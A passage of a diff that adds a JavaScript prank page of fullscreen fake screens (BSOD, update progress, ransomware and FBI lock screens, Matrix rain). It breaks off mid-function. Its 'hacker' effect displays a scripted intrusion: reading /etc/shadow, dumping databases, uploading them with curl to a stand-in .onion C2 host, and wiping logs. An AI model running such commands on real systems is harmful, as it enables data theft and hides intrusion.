+    <div class="se-card" data-effect="ransom"><div class="se-card-preview se-preview-ransom"><div class="se-card-icon" style="color:#ff3333"><i class="fas fa-lock"></i></div><div class="se-card-label"><h3 class="se-card-name">勒索病毒锁屏</h3><p class="se-card-desc">恶搞勒索病毒锁定界面</p></div></div></div>
+    <div class="se-card" data-effect="winactivate"><div class="se-card-preview se-preview-winactivate"><div class="se-card-icon" style="color:#ffc107"><i class="fas fa-copyright"></i></div><div class="se-card-label"><h3 class="se-card-name">Windows 激活锁</h3><p class="se-card-desc">系统未激活水印+弹窗</p></div></div></div>
+    <div class="se-card" data-effect="netadmin"><div class="se-card-preview se-preview-netadmin"><div class="se-card-icon" style="color:#dc3545"><i class="fas fa-user-shield"></i></div><div class="se-card-label"><h3 class="se-card-name">网管远程锁定</h3><p class="se-card-desc">网管警告锁定屏幕</p></div></div></div>
+    <div class="se-card" data-effect="rgboffset"><div class="se-card-preview se-preview-rgboffset"><div class="se-card-icon" style="color:#fff"><i class="fas fa-eye"></i></div><div class="se-card-label"><h3 class="se-card-name">RGB 色彩偏移</h3><p class="se-card-desc">屏幕花屏色彩分离效果</p></div></div></div>
+    <div class="se-card" data-effect="coldscreen"><div class="se-card-preview se-preview-coldscreen"><div class="se-card-icon" style="color:#fff"><i class="fas fa-snowflake"></i></div><div class="se-card-label"><h3 class="se-card-name">低温屏幕故障</h3><p class="se-card-desc">低温闪烁横纹故障</p></div></div></div>
+    <div class="se-card" data-effect="vhs"><div class="se-card-preview se-preview-vhs"><div class="se-card-icon" style="color:#fff"><i class="fas fa-video"></i></div><div class="se-card-label"><h3 class="se-card-name">VHS 录像带故障</h3><p class="se-card-desc">老式录像带噪点滚动</p></div></div></div>
+    <div class="se-card" data-effect="office"><div class="se-card-preview se-preview-office"><div class="se-card-icon" style="color:#fff"><i class="fas fa-file-word"></i></div><div class="se-card-label"><h3 class="se-card-name">Office 安装进度</h3><p class="se-card-desc">Microsoft Office 安装界面</p></div></div></div>
+    <div class="se-card" data-effect="bios"><div class="se-card-preview se-preview-bios"><div class="se-card-icon" style="color:#00ff00;font-family:monospace">BIOS</div><div class="se-card-label"><h3 class="se-card-name">BIOS 开机自检</h3><p class="se-card-desc">老式主板 BIOS 界面</p></div></div></div>
+    <div class="se-card" data-effect="android"><div class="se-card-preview se-preview-android"><div class="se-card-icon" style="color:#3ddc84"><i class="fab fa-android"></i></div><div class="se-card-label"><h3 class="se-card-name">安卓刷机界面</h3><p class="se-card-desc">Android 刷机 Loading</p></div></div></div>
+    <div class="se-card" data-effect="linuxpanic"><div class="se-card-preview se-preview-linuxpanic"><div class="se-card-icon" style="color:#ff6b6b;font-family:monospace">PANIC</div><div class="se-card-label"><h3 class="se-card-name">Linux 系统宕机</h3><p class="se-card-desc">Linux Kernel Panic 日志</p></div></div></div>
+    <div class="se-card" data-effect="cmdping"><div class="se-card-preview se-preview-cmdping"><div class="se-card-icon" style="color:#00ff00;font-family:monospace">PING</div><div class="se-card-label"><h3 class="se-card-name">CMD 无限 Ping</h3><p class="se-card-desc">命令行 Ping 刷屏效果</p></div></div></div>
+    <div class="se-card" data-effect="solitaire"><div class="se-card-preview se-preview-solitaire"><div class="se-card-icon" style="color:#fff"><i class="fas fa-heart"></i></div><div class="se-card-label"><h3 class="se-card-name">Windows 纸牌</h3><p class="se-card-desc">经典纸牌游戏全屏</p></div></div></div>
+    <div class="se-card" data-effect="batterylow"><div class="se-card-preview se-preview-batterylow"><div class="se-card-icon" style="color:#ff3333"><i class="fas fa-battery-quarter"></i></div><div class="se-card-label"><h3 class="se-card-name">电量低黑屏</h3><p class="se-card-desc">电量耗尽渐变黑屏</p></div></div></div>
+    <div class="se-card" data-effect="404"><div class="se-card-preview se-preview-404"><div class="se-card-icon" style="color:#343a40;font-size:36px">404</div><div class="se-card-label"><h3 class="se-card-name">浏览器 404</h3><p class="se-card-desc">全屏 404 错误页面</p></div></div></div>
+    <div class="se-card" data-effect="diskfull"><div class="se-card-preview se-preview-diskfull"><div class="se-card-icon" style="color:#dc3545"><i class="fas fa-hdd"></i></div><div class="se-card-label"><h3 class="se-card-name">磁盘空间不足</h3><p class="se-card-desc">C盘爆满警告弹窗</p></div></div></div>
+  </div>
+</div>
+
+<div class="se-overlay" id="se-overlay"></div>
+<div class="se-exit-hint" id="se-exit-hint">按 ESC 或双击退出全屏</div>
+
+<script>
+(function(){
+  const overlay = document.getElementById('se-overlay');
+  const exitHint = document.getElementById('se-exit-hint');
+  let currentEffect = null;
+  const animFrames = [];
+  const intervals = [];
+  let noiseNode = null;
+  let noiseGain = null;
+  let audioCtx = null;
+
+  function playSound(name) {
+    const sounds = {
+      bsod: 'https://assets.mixkit.co/sfx/preview/mixkit-windows-error-2151.mp3',
+      ransom: 'https://assets.mixkit.co/sfx/preview/mixkit-alarm-buzzer-991.mp3',
+      batterylow: 'https://assets.mixkit.co/sfx/preview/mixkit-low-battery-alert-1004.mp3'
+    };
+    if (sounds[name]) {
+      const a = new Audio(sounds[name]);
+      a.volume = 0.5;
+      a.play().catch(() => {});
+    }
+  }
+
+  function exitEffect() {
+    animFrames.forEach(cancelAnimationFrame);
+    intervals.forEach(clearInterval);
+    animFrames.length = 0;
+    intervals.length = 0;
+    if (noiseNode) { try { noiseNode.stop(); } catch(e) {} noiseNode = null; }
+    noiseGain = null;
+    audioCtx = null;
+    overlay.innerHTML = '';
+    overlay.className = 'se-overlay';
+    overlay.style.display = 'none';
+    exitHint.classList.remove('show');
+    currentEffect = null;
+    document.body.style.overflow = '';
+    if (document.fullscreenElement) document.exitFullscreen();
+  }
+
+  function showEffect(name) {
+    currentEffect = name;
+    document.body.style.overflow = 'hidden';
+    overlay.style.display = 'block';
+    overlay.className = 'se-overlay active';
+    exitHint.classList.add('show');
+    setTimeout(() => exitHint.classList.remove('show'), 3000);
+    playSound(name);
+    overlay.requestFullscreen().catch(() => {});
+
+    switch(name) {
+      case 'bsod': effectBSOD(); break;
+      case 'winupdate': effectWinUpdate(); break;
+      case 'macupdate': effectMacUpdate(); break;
+      case 'matrix': effectMatrix(); break;
+      case 'hacker': effectHacker(); break;
+      case 'whitenoise': effectWhiteNoise(); break;
+      case 'fbi': effectFBI(); break;
+      case 'broken': effectBroken(); break;
+      case 'dvd': effectDVD(); break;
+      case 'crt': effectCRT(); break;
+      case 'glitch': effectGlitch(); break;
+      case 'starfield': effectStarfield(); break;
+      case 'fire': effectFire(); break;
+      case 'loading': effectLoading(); break;
+      case 'bsod11': effectBSOD11(); break;
+      case 'chkdsk': effectCHKDSK(); break;
+      case 'ransom': effectRansom(); break;
+      case 'winactivate': effectWinActivate(); break;
+      case 'netadmin': effectNetAdmin(); break;
+      case 'rgboffset': effectRGBOffset(); break;
+      case 'coldscreen': effectColdScreen(); break;
+      case 'vhs': effectVHS(); break;
+      case 'office': effectOffice(); break;
+      case 'bios': effectBIOS(); break;
+      case 'android': effectAndroid(); break;
+      case 'linuxpanic': effectLinuxPanic(); break;
+      case 'cmdping': effectCmdPing(); break;
+      case 'solitaire': effectSolitaire(); break;
+      case 'batterylow': effectBatteryLow(); break;
+      case '404': effect404(); break;
+      case 'diskfull': effectDiskFull(); break;
+    }
+  }
+
+  // 基础效果
+  function effectBSOD(){
+    overlay.innerHTML = `<div class="se-bsod"><div class="se-bsod-sad">:(</div><div class="se-bsod-title">Your PC ran into a problem and needs to restart.</div><div style="display:flex;gap:24px"><div class="se-bsos-qrcode"></div><div class="se-bsod-detail">Stop code: CRITICAL_PROCESS_DIED</div></div><div class="se-bsod-progress" id="p">0%</div></div>`;
+    let p = 0; const iv = setInterval(()=>{ p+=2; document.getElementById('p').textContent = p+'% complete'; if(p>=100) clearInterval(iv); },600); intervals.push(iv);
+  }
+  function effectWinUpdate(){
+    overlay.innerHTML = `<div class="se-winupdate"><i class="fas fa-circle-notch se-winupdate-icon"></i><div class="se-winupdate-title">正在更新</div><div class="se-winupdate-subtitle">请勿关闭计算机</div><div class="se-winupdate-bar"><div class="se-winupdate-bar-inner" id="b"></div></div><div class="se-winupdate-percent" id="p">0%</div></div>`;
+    let p=0; const iv=setInterval(()=>{ p<97&&(p+=1); document.getElementById('b').style.width=p+'%'; document.getElementById('p').textContent=p+'%'; },400); intervals.push(iv);
+  }
+  function effectMacUpdate(){
+    overlay.innerHTML = `<div class="se-macupdate"><i class="fab fa-apple se-macupdate-icon"></i><div class="se-macupdate-title">正在更新 macOS</div><div class="se-macupdate-subtitle">正在安装更新…</div><div class="se-macupdate-bar"><div class="se-macupdate-bar-inner" id="b"></div></div><div class="se-macupdate-time" id="t">预计 20 分钟</div></div>`;
+    let p=0; const iv=setInterval(()=>{ p<100&&(p+=1); document.getElementById('b').style.width=p+'%'; document.getElementById('t').textContent=`预计 ${Math.max(1,Math.round(20*(100-p)/100))} 分钟`; },600); intervals.push(iv);
+  }
+  function effectBSOD11(){
+    overlay.innerHTML = `<div class="se-bsod11"><div class="se-bsod11-sad">:(</div><div class="se-bsod11-title">您的设备遇到问题，需要重启</div><div class="se-bsod11-qrcode"></div><div class="se-bsod11-detail">错误代码：WHEA_UNCORRECTABLE_ERROR</div><div class="se-bsod11-progress" id="p">0%</div></div>`;
+    let p=0; const iv=setInterval(()=>{ p+=2; document.getElementById('p').textContent=p+'%'; if(p>=100) clearInterval(iv); },600); intervals.push(iv);
+  }
+  function effectRansom(){
+    overlay.innerHTML = `<div class="se-ransom"><i class="fas fa-skull-crossbones se-ransom-icon"></i><div class="se-ransom-title">您的文件已被加密</div><div class="se-ransom-text">您的所有重要文件已被加密，只有通过支付才能恢复。扫描下方二维码获取解密说明。</div><div class="se-ransom-qr"></div><div class="se-ransom-tip">请勿关闭此窗口，否则文件将永久损坏</div></div>`;
+  }
+  function effectWinActivate(){
+    overlay.innerHTML = `<div class="se-winactivate"><div class="se-winactivate-watermark">激活 Windows</div><div class="se-winactivate-popup"><div class="se-winactivate-icon"><i class="fas fa-exclamation-triangle"></i></div><div class="se-winactivate-title">Windows 未激活</div><div class="se-winactivate-desc">请转到“设置”以激活 Windows。</div><button class="se-winactivate-btn">转到激活</button><span class="se-winactivate-link">稍后提示</span></div></div>`;
+  }
+  function effectNetAdmin(){
+    overlay.innerHTML = `<div class="se-netadmin"><div class="se-netadmin-popup"><div class="se-netadmin-icon"><i class="fas fa-user-shield"></i></div><div class="se-netadmin-title">网络管理员已锁定此设备</div><div class="se-netadmin-text">检测到违规操作，屏幕已被管理员锁定。请联系网络中心解除限制。</div><div class="se-netadmin-signature">系统安全中心 · 自动锁定程序</div></div></div>`;
+  }
+  function effectRGBOffset(){
+    overlay.innerHTML = `<div class="se-rgboffset"><div class="se-rgboffset-layer se-rgboffset-red">ERROR</div><div class="se-rgboffset-layer se-rgboffset-green">ERROR</div><div class="se-rgboffset-layer se-rgboffset-blue">ERROR</div><div class="se-rgboffset-noise"></div></div>`;
+  }
+  function effectColdScreen(){
+    overlay.innerHTML = `<div class="se-coldscreen"><div class="se-coldscreen-lines"></div><div class="se-coldscreen-text">屏幕温度过低 • 显示异常</div></div>`;
+  }
+  function effectVHS(){
+    overlay.innerHTML = `<div class="se-vhs"><div class="se-vhs-noise"></div><div class="se-vhs-distortion"></div><div class="se-vhs-text">VHS 信号丢失</div></div>`;
+  }
+  function effectOffice(){
+    overlay.innerHTML = `<div class="se-office"><i class="fas fa-file-office se-office-logo"></i><div class="se-office-title">正在安装 Office</div><div class="se-office-subtitle">请稍候，安装正在进行中</div><div class="se-office-bar"><div class="se-office-bar-inner" id="b"></div></div><div class="se-office-percent" id="p">0%</div></div>`;
+    let p=0; const iv=setInterval(()=>{ p<97&&(p+=1); document.getElementById('b').style.width=p+'%'; document.getElementById('p').textContent=p+'%'; },400); intervals.push(iv);
+  }
+  function effectBIOS(){
+    overlay.innerHTML = `<div class="se-bios"><div class="se-bios-header">AMI BIOS v2.15 - System Initializing</div><div class="se-bios-line se-bios-success">CPU: Intel(R) Core(TM) i7-10700K @ 3.80GHz - OK</div><div class="se-bios-line se-bios-success">RAM: 16384MB OK</div><div class="se-bios-line se-bios-warning">HDD: SMART Status Check Pending</div><div class="se-bios-line se-bios-success">Keyboard Detected</div><div class="se-bios-line se-bios-error">CMOS Checksum Bad - Defaults Loaded</div></div>`;
+  }
+  function effectAndroid(){
+    overlay.innerHTML = `<div class="se-android"><i class="fab fa-android se-android-logo"></i><div class="se-android-text">正在安装系统更新…</div><div class="se-android-bar"><div class="se-android-bar-inner" id="b"></div></div><div class="se-android-detail">请勿断开电源</div></div>`;
+    let p=0; const iv=setInterval(()=>{ p<97&&(p+=1); document.getElementById('b').style.width=p+'%'; },400); intervals.push(iv);
+  }
+  function effectLinuxPanic(){
+    overlay.innerHTML = `<div class="se-linuxpanic"><div class="se-linuxpanic-header">KERNEL PANIC - NOT SYNCING: VFS: Unable to mount root fs</div><div class="se-linuxpanic-line se-linuxpanic-error">Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)</div><div class="se-linuxpanic-line se-linuxpanic-info">CPU: 0 PID: 1 Comm: swapper/0 Not tainted 5.15.0-78-generic</div><div class="se-linuxpanic-line se-linuxpanic-info">Hardware name: VMware Virtual Platform/440BX Desktop Reference Platform</div></div>`;
+  }
+  function effectCmdPing(){
+    overlay.innerHTML = `<div class="se-cmdping" id="c"></div>`;
+    const c = document.getElementById('c');
+    const iv = setInterval(()=>{
+      c.innerHTML += `<div class="se-cmdping-prompt">C:\\>ping 127.0.0.1 -t</div><div class="se-cmdping-output">Reply from 127.0.0.1: bytes=32 time<1ms TTL=128</div>`;
+      c.scrollTop = c.scrollHeight;
+    },200);
+    intervals.push(iv);
+  }
+  function effectSolitaire(){
+    overlay.innerHTML = `<div class="se-solitaire"><div class="se-solitaire-card">A</div><div class="se-solitaire-text">经典纸牌</div></div>`;
+  }
+  function effectBatteryLow(){
+    overlay.innerHTML = `<div class="se-batterylow"><i class="fas fa-battery-empty se-batterylow-icon"></i><div class="se-batterylow-percent" id="p">5%</div><div class="se-batterylow-text">电量严重不足，即将关机</div><div class="se-batterylow-fade"></div></div>`;
+    let p=5; const iv=setInterval(()=>{ p>0&&(p-=1); document.getElementById('p').textContent=p+'%'; },1500); intervals.push(iv);
+  }
+  function effect404(){
+    overlay.innerHTML = `<div class="se-404"><div class="se-404-code">404</div><div class="se-404-title">页面未找到</div><div class="se-404-desc">您尝试访问的页面不存在或已被移动。</div><button class="se-404-btn">返回主页</button></div>`;
+  }
+  function effectDiskFull(){
+    overlay.innerHTML = `<div class="se-diskfull"><div class="se-diskfull-popup"><div class="se-diskfull-icon"><i class="fas fa-hdd"></i></div><div class="se-diskfull-title">磁盘空间不足</div><div class="se-diskfull-text">系统磁盘空间已满，无法继续操作。请清理磁盘空间后重试。</div><div class="se-diskfull-bar"><div class="se-diskfull-bar-inner"></div></div><div class="se-diskfull-usage">已使用 98%</div><button class="se-diskfull-btn">确定</button></div></div>`;
+  }
+
+  // ===== 黑客帝国数字雨 =====
+  function effectMatrix(){
+    overlay.innerHTML = '<div class="se-matrix"><canvas id="se-matrix-canvas"></canvas></div>';
+    const canvas = document.getElementById('se-matrix-canvas');
+    const ctx = canvas.getContext('2d');
+    let W, H;
+    const fontSize = 16;
+    let columns, streams;
+    function init(){
+      W = overlay.clientWidth || window.innerWidth;
+      H = overlay.clientHeight || window.innerHeight;
+      canvas.width = W; canvas.height = H;
+      columns = Math.floor(W / fontSize);
+      streams = [];
+      for (let i = 0; i < columns; i++){
+        streams[i] = {
+          y: Math.random() * H / fontSize * -1,
+          speed: 0.3 + Math.random() * 0.5,
+          trailLen: 12 + Math.floor(Math.random() * 18)
+        };
+      }
+    }
+    init();
+    const chars = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ0123456789';
+    let frameCount = 0;
+    function draw(){
+      ctx.fillStyle = 'rgba(0,0,0,0.06)';
+      ctx.fillRect(0, 0, W, H);
+      ctx.font = fontSize + 'px monospace';
+      frameCount++;
+      for (let i = 0; i < columns; i++){
+        const s = streams[i];
+        if (frameCount % 2 === 0 || s.speed > 0.6) s.y += s.speed;
+        const x = i * fontSize;
+        const y = Math.floor(s.y) * fontSize;
+        const headCh = chars[Math.floor(Math.random()*chars.length)];
+        ctx.fillStyle = '#fff'; ctx.shadowColor = '#00ff41'; ctx.shadowBlur = 8;
+        ctx.fillText(headCh, x, y); ctx.shadowBlur = 0;
+        for (let t = 1; t <= s.trailLen; t++){
+          const ty = y - t * fontSize;
+          if (ty < 0) continue;
+          const alpha = 1 - (t / s.trailLen);
+          if (alpha < 0.05) continue;
+          ctx.fillStyle = 'rgba(0,' + Math.floor(180+75*alpha) + ',65,' + (alpha*0.7) + ')';
+          ctx.fillText(chars[Math.floor(Math.random()*chars.length)], x, ty);
+        }
+        if (y > H + s.trailLen * fontSize){
+          if (Math.random() > 0.96){
+            s.y = Math.random() * -10;
+            s.speed = 0.3 + Math.random() * 0.5;
+            s.trailLen = 12 + Math.floor(Math.random() * 18);
+          }
+        }
+      }
+      animFrames.push(requestAnimationFrame(draw));
+    }
+    ctx.fillStyle = '#000'; ctx.fillRect(0, 0, W, H);
+    draw();
+  }
+
+  // ===== 黑客终端 =====
+  function effectHacker(){
+    overlay.innerHTML = '<div class="se-hacker" id="se-hacker"></div>';
+    const terminal = document.getElementById('se-hacker');
+    const lines = [
+      {t:'prompt', v:'root@kali:~# nmap -sV -sC --script=vuln 192.168.1.0/24'},
+      {t:'output', v:'Starting Nmap 7.94 at 2026-06-03 22:15 CST'},
+      {t:'output', v:'Scanning 256 hosts... [████████████████████] 100%'},
+      {t:'output', v:'22/tcp   open  ssh         OpenSSH 8.9'},
+      {t:'output', v:'80/tcp   open  http        Apache/2.4.52'},
+      {t:'output', v:'3306/tcp open  mysql       MySQL 8.0.32'},
+      {t:'warn',   v:'VULNERABLE: SQL Injection in /api/users'},
+      {t:'output', v:''},
+      {t:'prompt', v:'root@kali:~# ssh root@192.168.1.105'},
+      {t:'output', v:'Password: ********'},
+      {t:'success',v:'Access granted. Welcome to Ubuntu 22.04 LTS'},
+      {t:'prompt', v:'root@target:~# cat /etc/shadow | head -5'},
+      {t:'output', v:'root:$6$Rk3xQ9$vN7m...hashed:19500:0:99999:7:::'},
+      {t:'prompt', v:'root@target:~# mysqldump -u root --all-databases > /tmp/.db.sql'},
+      {t:'output', v:'Dumping... done. Size: 14.7MB'},
+      {t:'prompt', v:'root@target:~# curl -X POST https://c2.darkweb.onion/upload -F "f=@/tmp/.db.sql"'},
+      {t:'success',v:'Upload complete. HTTP 200 OK.'},
+      {t:'prompt', v:'root@target:~# rm -rf /var/log/* && history -c'},
+      {t:'success',v:'All traces removed.'},
+      {t:'output', v:''},
+      {t:'error',  v:'████ SYSTEM FULLY COMPROMISED ████'},
+      {t:'output', v:''},
+      {t:'prompt', v:'root@target:~# '}
+    ];
+    let lineIdx = 0, charIdx = 0;
+    function typeLine(){
+      if (lineIdx >= lines.length){
+        const last = terminal.lastElementChild;
+        if (last) last.innerHTML += '<span class="se-hacker-cursor"></span>';
+        return;
+      }
+      const line = lines[lineIdx];
+      if (charIdx === 0){
+        const div = document.createElement('div');
+        div.className = 'se-hacker-line se-hacker-' + line.t;
+        terminal.appendChild(div);
+      }
+      const div = terminal.lastElementChild;
+      if (charIdx < line.v.length){
+        div.textContent = line.v.substring(0, charIdx + 1);
+        charIdx++;
+        setTimeout(typeLine, 15 + Math.random() * 30);
+      } else {
+        charIdx = 0; lineIdx++;
+        terminal.scrollTop = terminal.scrollHeight;
+        setTimeout(typeLine, 100 + Math.random() * 200);
+      }
+    }
+    typeLine();
+  }
+
+  // ===== 白噪音辅助 =====
+  function startNoise(type){
+    if (noiseNode) { try { noiseNode.stop(); } catch(e) {} noiseNode = null; }
+    try {
+      audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
+      if (audioCtx.state === 'suspended') audioCtx.resume();
+      const bufferSize = 2 * audioCtx.sampleRate;
+      const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+      const data = buffer.getChannelData(0);
+      if (type === 'white'){ for (let i = 0; i < bufferSize; i++) data[i] = Math.random()*2-1; }
+      else if (type === 'brown'){ let last=0; for (let i=0;i<bufferSize;i++){ const w=Math.random()*2-1; data[i]=(last+0.02*w)/1.02; last=data[i]; data[i]*=3.5; } }
+      else if (type === 'pink'){ let b0=0,b1=0,b2=0,b3=0,b4=0,b5=0,b6=0; for (let i=0;i<bufferSize;i++){ const w=Math.random()*2-1; b0=0.99886*b0+w*0.0555179; b1=0.99332*b1+w*0.0750759; b2=0.96900*b2+w*0.1538520; b3=0.86650*b3+w*0.3104856; b4=0.55000*b4+w*0.5329522; b5=-0.7616*b5-w*0.0168980; data[i]=(b0+b1+b2+b3+b4+b5+b6+w*0.5362)*0.11; b6=w*0.115926; } }
+      noiseNode = audioCtx.createBufferSource(); noiseNode.buffer = buffer; noiseNode.loop = true;
+      noiseGain = audioCtx.createGain(); noiseGain.gain.value = 0.3;
+      noiseNode.connect(noiseGain); noiseGain.connect(audioCtx.destination); noiseNode.start();
+    } catch(e) {}
+  }
+
+  // ===== 白噪音 =====
+  function effectWhiteNoise(){
+    overlay.innerHTML = '<div class="se-whitenoise"><canvas id="se-noise-canvas"></canvas><div class="se-whitenoise-info"><div class="se-whitenoise-title">白噪音</div><div class="se-whitenoise-subtitle">放松身心，助眠静心</div><div class="se-whitenoise-controls"><button class="se-whitenoise-btn active" data-noise="white">白噪音</button><button class="se-whitenoise-btn" data-noise="brown">棕噪音</button><button class="se-whitenoise-btn" data-noise="pink">粉噪音</button></div></div></div>';
+    const canvas = document.getElementById('se-noise-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = Math.floor((overlay.clientWidth || window.innerWidth)/3);
+    canvas.height = Math.floor((overlay.clientHeight || window.innerHeight)/3);
+    function drawNoise(){
+      const img = ctx.createImageData(canvas.width, canvas.height);
+      for (let i = 0; i < img.data.length; i += 4){ const v = Math.random()*255; img.data[i]=img.data[i+1]=img.data[i+2]=v; img.data[i+3]=255; }
+      ctx.putImageData(img, 0, 0);
+      animFrames.push(requestAnimationFrame(drawNoise));
+    }
+    drawNoise();
+    startNoise('white');
+    overlay.querySelectorAll('.se-whitenoise-btn').forEach(btn => {
+      btn.addEventListener('click', e => {
+        e.stopPropagation();
+        overlay.querySelectorAll('.se-whitenoise-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        startNoise(btn.dataset.noise);
+      });
+    });
+  }
+
+  // ===== FBI 锁定 =====
+  function effectFBI(){
+    overlay.innerHTML = '<div class="se-fbi"><div class="se-fbi-seal">DEPT<br>OF<br>JUSTICE</div><div class="se-fbi-title">THIS COMPUTER HAS BEEN LOCKED</div><div class="se-fbi-text">Your computer has been locked due to violations of federal law.<br><br>• Article 18 U.S.C. § 1030 — Fraud and related activity in connection with computers<br>• Article 18 U.S.C. § 2252 — Certain activities relating to material involving the sexual exploitation of minors<br>• Article 17 U.S.C. § 501 — Copyright infringement<br><br>To unlock your computer and avoid prosecution, you must pay a fine of $500 within 48 hours.</div><div class="se-fbi-warning">⚠️ This is a simulation for entertainment purposes only.</div></div>';
+  }
+
+  // ===== 碎屏 =====
+  function effectBroken(){
+    overlay.innerHTML = '<div class="se-broken"><canvas id="se-broken-canvas"></canvas></div>';
+    const canvas = document.getElementById('se-broken-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = overlay.clientWidth || window.innerWidth;
+    canvas.height = overlay.clientHeight || window.innerHeight;
+    const W = canvas.width, H = canvas.height, cx = W/2, cy = H/2;
+    ctx.fillStyle = '#1e293b'; ctx.fillRect(0, 0, W, H);
+    function drawCrack(sx, sy, angle, length, depth){
+      if (depth <= 0 || length < 5) return;
+      const ex = sx + Math.cos(angle)*length, ey = sy + Math.sin(angle)*length;
+      ctx.beginPath(); ctx.moveTo(sx, sy); ctx.lineTo(ex, ey);
+      ctx.strokeStyle = 'rgba(255,255,255,' + (0.15+depth*0.08) + ')'; ctx.lineWidth = depth*0.8; ctx.stroke();
+      for (let i = 0; i < Math.floor(Math.random()*3)+1; i++) drawCrack(ex, ey, angle+(Math.random()-0.5)*1.2, length*(0.4+Math.random()*0.4), depth-1);
+    }
+    for (let i = 0; i < 6+Math.floor(Math.random()*4); i++) drawCrack(cx, cy, (Math.PI*2/8)*i+(Math.random()-0.5)*0.5, Math.min(W,H)*(0.2+Math.random()*0.3), 5);
+    for (let r = 30; r < 200; r += 50){ ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI*2); ctx.strokeStyle = 'rgba(255,255,255,' + Math.max(0.02, 0.12-r*0.0005) + ')'; ctx.lineWidth = 1; ctx.stroke(); }
+    const grad = ctx.createRadialGradient(cx, cy, 0, cx, cy, 60); grad.addColorStop(0, 'rgba(255,255,255,0.3)'); grad.addColorStop(1, 'rgba(255,255,255,0)'); ctx.fillStyle = grad; ctx.fillRect(cx-60, cy-60, 120, 120);
+  }
+
+  // ===== DVD 屏保 =====
+  function effectDVD(){
+    overlay.innerHTML = '<div class="se-dvd"><div class="se-dvd-logo" id="se-dvd-logo">DVD</div></div>';
+    const logo = document.getElementById('se-dvd-logo');
+    const colors = ['#e74c3c','#3498db','#2ecc71','#f39c12','#9b59b6','#1abc9c','#e67e22','#ec407a','#00bcd4','#ff5722'];
+    let x = 100, y = 100, dx = 3, dy = 2.1, ci = 0;
+    logo.style.color = colors[0];
+    function bounce(){
+      x += dx; y += dy;
+      const w = (overlay.clientWidth || window.innerWidth) - 120, h = (overlay.clientHeight || window.innerHeight) - 40;
+      let hit = false;
+      if (x <= 0) { dx = Math.abs(dx); hit = true; x = 0; }
+      if (x >= w) { dx = -Math.abs(dx); hit = true; x = w; }
+      if (y <= 0) { dy = Math.abs(dy); hit = true; y = 0; }
+      if (y >= h) { dy = -Math.abs(dy); hit = true; y = h; }
+      if (hit) { ci = (ci+1) % colors.length; logo.style.color = colors[ci]; logo.style.textShadow = '0 0 20px '+colors[ci]+',0 0 40px '+colors[ci]; }
+      logo.style.left = x + 'px'; logo.style.top = y + 'px';
+      animFrames.push(requestAnimationFrame(bounce));
+    }
+    bounce();
+  }
+
+  // ===== CRT 显示器 =====
+  function effectCRT(){
+    overlay.innerHTML = '<div class="se-crt"><canvas id="se-crt-canvas"></canvas><div class="se-crt-scanlines"></div><div class="se-crt-vignette"></div><div class="se-crt-flicker"></div></div>';
+    const canvas = document.getElementById('se-crt-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = overlay.clientWidth || window.innerWidth;
+    canvas.height = overlay.clientHeight || window.innerHeight;
+    const W = canvas.width, H = canvas.height, fontSize = 14;
+    ctx.font = fontSize + 'px monospace';
+    ctx.fillStyle = '#33ff33';
+    const bootLines = [
+      'BIOS v3.24 - System Check',
+      'Memory Test: 640K OK',
+      'Detecting IDE drives...',
+      'Primary Master: WD Caviar 850MB', 'Primary Slave: None',
+      'Secondary Master: CD-ROM 52X',
+      'Initializing USB controllers... Done',
+      '', 'Loading system...', 'Starting MS-DOS...', '',
+      'C:\\>dir',
+      ' Volume in drive C is SYSTEM',
+      ' Volume Serial Number is 1A2B-3C4D',
+      ' Directory of C:\\', '',
+      'SYSTEM    COM   54,619  03-17-97  12:00a',
+      'COMMAND   COM   93,890  03-17-97  12:00a',
+      'CONFIG    SYS      256  06-03-26  10:15a',
+      'AUTOEXEC  BAT      128  06-03-26  10:15a',
+      'DOS          <DIR>     03-17-97  12:00a',
+      'WINDOWS      <DIR>     03-17-97  12:00a',
+      'GAMES        <DIR>     06-03-26  10:20a',
+      '       5 file(s)    148,893 bytes',
+      '       3 dir(s)  425,984,000 bytes free',
+      '', 'C:\\>win', 'Starting Windows 95...', '',
+      '*** SYSTEM HALTED ***'
+    ];
+    let lineIdx = 0, y = fontSize + 10;
+    let cursorVisible = true, cursorBlink = 0;
+    function drawCRT(){
+      ctx.fillStyle = 'rgba(0,10,0,0.01)'; ctx.fillRect(0, 0, W, H);
+      cursorBlink++;
+      if (cursorBlink % 30 === 0) cursorVisible = !cursorVisible;
+      if (cursorVisible && lineIdx >= bootLines.length){
+        ctx.fillStyle = '#33ff33';
+        ctx.fillRect(10, y - fontSize + 2, fontSize*0.6, fontSize);
+      }
+      animFrames.push(requestAnimationFrame(drawCRT));
+    }
+    function typeBoot(){
+      if (lineIdx >= bootLines.length) return;
+      ctx.fillStyle = '#33ff33'; ctx.shadowColor = '#33ff33'; ctx.shadowBlur = 4;
+      ctx.fillText(bootLines[lineIdx], 10, y); ctx.shadowBlur = 0;
+      y += fontSize + 4; lineIdx++;
+      setTimeout(typeBoot, 80 + Math.random() * 120);
+    }
+    ctx.fillStyle = '#000800'; ctx.fillRect(0, 0, W, H);
+    typeBoot(); drawCRT();
+  }
+
+  // ===== 故障效果 =====
+  function effectGlitch(){
+    overlay.innerHTML = '<div class="se-glitch"><canvas id="se-glitch-canvas"></canvas></div>';
+    const canvas = document.getElementById('se-glitch-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = overlay.clientWidth || window.innerWidth;
+    canvas.height = overlay.clientHeight || window.innerHeight;
+    const W = canvas.width, H = canvas.height;
+    const glitchText = 'SYSTEM ERROR';
+    let frameCount = 0;
+    function draw(){
+      frameCount++;
+      if (Math.random() < 0.15){
+        ctx.fillStyle = Math.random() > 0.5 ? 'rgba(255,0,102,0.1)' : 'rgba(0,255,255,0.1)';
+        ctx.fillRect(Math.random()*W, Math.random()*H, Math.random()*W*0.6, Math.random()*40+5);
+      }
+      if (Math.random() < 0.08){
